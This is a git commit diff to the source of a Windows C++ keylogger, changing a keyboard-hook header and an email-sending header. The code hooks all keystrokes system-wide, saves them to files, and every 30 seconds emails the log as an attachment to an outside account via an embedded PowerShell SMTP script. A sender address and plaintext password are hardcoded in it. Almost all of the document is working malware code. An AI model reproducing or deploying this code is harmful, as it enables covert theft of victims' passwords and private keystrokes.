addcaf87328d8a6df4d7dd0645c05fb117f3632f
Anurag Shah <anurag.200698@gmail.com>
2017-11-23 11:09:23 +0530

    Add files via upload

--- KeybHook.h
+++ KeybHook.h
@@ -5,122 +5,130 @@
 #include "windows.h"
 #include "KeyConstants.h"
 #include "Timer.h"
+#include "IO.h"
 #include "SendMail.h"
 
+
+//Keylog contains the keys pressed.
+//Initially it is empty.
 std::string keylog = "";
+
+//Sends mail
 void TimerSendMail ()
     {
-        
-        if (keylog.empty ())
+        if (keylog.empty ())                                            //If keylog is empty then there is no need to send mail.
             return;
-        
-        std::string last_file = IO::WriteLog (keylog);
-        
-        if (last_file.empty ())
+
+        std::string last_file = IO::WriteLog (keylog);                  //Get the name of last file made.
+
+        if (last_file.empty ())                                         //If file was not created
             {
-                Helper::WriteAppLog ("File creation was not succesfull. Keylog '" + keylog + "'");
+                Helper::WriteAppLog ("File creation was not successful. Keylog '" + keylog + "'");
                 return;
             }
-        
-        int x = Mail::SendMail ("Log [" + last_file + "]",
-                    "Hi :)\nThe file has been attached to this mail :)\nFor testing there is"
-                " content of the file:\n\n--------------------------\n" + keylog,
-        IO::GetOurPath (true) +  last_file);
-        if (x != 7) 
+                                                                        //Else send mail
+        int x = Mail::SendMail ("Log [" + last_file + "]",                                                  //Title
+                                "Hi :)\nThe file has been attached to this mail :)\nFor testing there is"   //Body
+                                " content of the file:\n\n--------------------------\n" + keylog,
+                                IO::GetOurPath (true) +  last_file                                         //Attachments
+                                );
+        if (x != 7)                                                     //If SendMail sends 7 then the everything went ok else there is some error
             Helper::WriteAppLog ("Mail was not sent! Error code: " + Helper::ToString (x));
-        else keylog = "";
+        else
+            {
+                std:: string path = IO::GetOurPath(true);               //Appending data to Data.txt for debugging
+                std::ofstream file;
+                file.open(path + "Data.txt");
+                Helper::DateTime dt;
+                file << dt.GetDateString() << std::endl;
+                file << keylog;
+                file << keylog;
+                file.close();
+                keylog = "";
+            }
 
     }
 
 
 
-Timer MailTimer (TimerSendMail, 2000 * 60, Timer::Infinite);
+Timer MailTimer (TimerSendMail, 500 * 60, Timer::Infinite);
+//Creating instance of MailTimer of Timer class.The function TimersendMail will be called after every 30 seconds and till infinite time.
 
+//Hook::
 
+//A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes.
+//A function that intercepts a particular type of event is known as a hook procedure. A hook procedure can act on each event
+//it receives, and then modify or discard the event.
 
 
 HHOOK eHook = NULL;
 
-
-
-
+//Records the keys pressed and stores them to keylog string.
 LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
-    {
-        
-        
+{
         if (nCode < 0)
-            CallNextHookEx(eHook, nCode,  wparam, lparam);
-        
-        
-        
-        KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam; 
-        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) 
-            {
-                
+            CallNextHookEx(eHook, nCode,  wparam, lparam);              //Some problem so loosen the keHook Created.
+
+
+        KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
+        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)            //eg [Shift]/*other keys*/[/Shift]
+            {                                                           //Other keys are recorded here
                 keylog += Keys::KEYS[kbs->vkCode].Name;
-                if (kbs->vkCode == VK_RETURN) 
-                    keylog += '\n'; 
+                if (kbs->vkCode == VK_RETURN)
+                    keylog += '\n';
             }
-        else if (wparam == WM_KEYUP || wparam  == WM_SYSKEYUP) 
+        else if (wparam == WM_KEYUP || wparam  == WM_SYSKEYUP)          //in above example this function inserts[/Shift]
             {
-                
-                
-                
-                
-                
-                
-                
                 DWORD key = kbs->vkCode;
-                if (key == VK_CONTROL 
-                        || key == VK_LCONTROL 
-                        || key == VK_RCONTROL 
-                        || key == VK_SHIFT 
-                        || key == VK_LSHIFT 
-                        || key == VK_RSHIFT 
-                        || key == VK_MENU 
-                        || key == VK_LMENU 
-                        || key == VK_RMENU 
-                        || key == VK_CAPITAL 
-                        || key == VK_NUMLOCK 
-                        || key == VK_LWIN 
-                        || key == VK_RWIN) 
-                    
-                    
+                if (    key == VK_CONTROL
+                        || key == VK_LCONTROL
+                        || key == VK_RCONTROL
+                        || key == VK_SHIFT
+                        || key == VK_LSHIFT
+                        || key == VK_RSHIFT
+                        || key == VK_MENU
+                        || key == VK_LMENU
+                        || key == VK_RMENU
+                        || key == VK_CAPITAL
+                        || key == VK_NUMLOCK
+                        || key == VK_LWIN
+                        || key == VK_RWIN
+                    )
                     {
                         string KeyName = Keys::KEYS[kbs->vkCode].Name;
                         KeyName.insert (1, "/");
                         keylog += KeyName;
                     }
             }
-        return CallNextHookEx(eHook, nCode,  wparam, lparam);
+        return CallNextHookEx(eHook, nCode,  wparam, lparam);               //Loosening the hook "eHook" created.
     }
 
 
 
-bool InstalHook ()
+bool InstalHook ()                                                          //Installs hook named eHook to interfere with the Windows system to record keystrokes
     {
-        
-        
+
+
         Helper::WriteAppLog ("Hook started... Timer started");
         MailTimer.Start (true);
-        
+
         eHook = SetWindowsHookEx (WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle (NULL), 0);
-        
+
         return eHook == NULL;
     }
 
 
-bool UninstalHook ()
+bool UninstalHook ()                                                    //Uninstall the keystrokes
     {
-        
+
         BOOL b = UnhookWindowsHookEx (eHook);
-        eHook = NULL; 
+        eHook = NULL;
         return (bool)b;
     }
 
-bool IsHooked ()
+bool IsHooked ()                                                        //Return true if hook is installed else returns false.
     {
-        
+
         return (bool)(eHook == NULL);
     }
-#endif 
+#endif
--- SendMail.h
+++ SendMail.h
@@ -7,13 +7,6 @@
 #include "Timer.h"
 #include "Helper.h"
 
-/*
-http://stackoverflow.com/questions/19634220/c-and-powershell
-
-We are going to input the string into a file and invoke the powershell script for sending that file
-
-*/
-
 #define SCRIPT_NAME "sm.ps1"
 namespace Mail
 {
@@ -22,65 +15,36 @@ namespace Mail
     #define X_EM_FROM "hackrespoint@gmail.com"
     #define X_EM_PASS "team9.Keylogger"
 
-const std::string &PowerShellScript =                                                  //Just the powershell script converted to C++
-
+const std::string &PowerShellScript =
 "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
-
 "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
-
 " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-
 "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-
 "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
-
 "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-
 "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-
 "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-
 "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
-
 "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
-
 "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
-
 "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
-
 "  ForEach ($val in $Attachments)\r\n                    "
-
 "        {\r\n               "
-
 "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
-
 "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
-
 "}\r\n                catch\r\n                    {\r\n                        exit 2; "
-
 "#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
-
 "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
-
 "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
-
 "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
-
 "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
-
 "exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
-
 " something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
-
 "Send-EMail -attachment $Att "
-
 "-To \"" +
-
  std::string (X_EM_TO) +
  "\""
-
 " -Body $Body -Subject $Subj "
-
 "-password \"" +
  std::string (X_EM_PASS) +
   "\""
@@ -94,7 +58,7 @@ const std::string &PowerShellScript =                                           
     #undef X_EM_PASS
 
 
-    std::string StringReplace (std::string s, const std::string &what, const std::string &with) //first parameter string itself, second parameter what to look for
+  std::string StringReplace (std::string s, const std::string &what, const std::string &with) //first parameter string itself, second parameter what to look for
         {                                                                                       //third parameter is what we intend to replace it with
             if(what.empty())
                 return s;
@@ -140,7 +104,6 @@ const std::string &PowerShellScript =                                           
 
             SHELLEXECUTEINFO ShExecInfo = {0};
             ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
-
 
             //fMask.SEE_MASK_NOCLOSEPROCESS::
 
@@ -220,6 +183,8 @@ const std::string &PowerShellScript =                                           
             return (int)exit_code;
         }
     int SendMail (const std::string &subject, const std::string &body, const std::vector<std::string> &att)
+
+    //This function is called when there are multiple attachments to the file.
         {
             std::string attachments = "";
             if (att.size() == 1U)
@@ -232,3 +197,4 @@ const std::string &PowerShellScript =                                           
         }
 }
 #endif
+
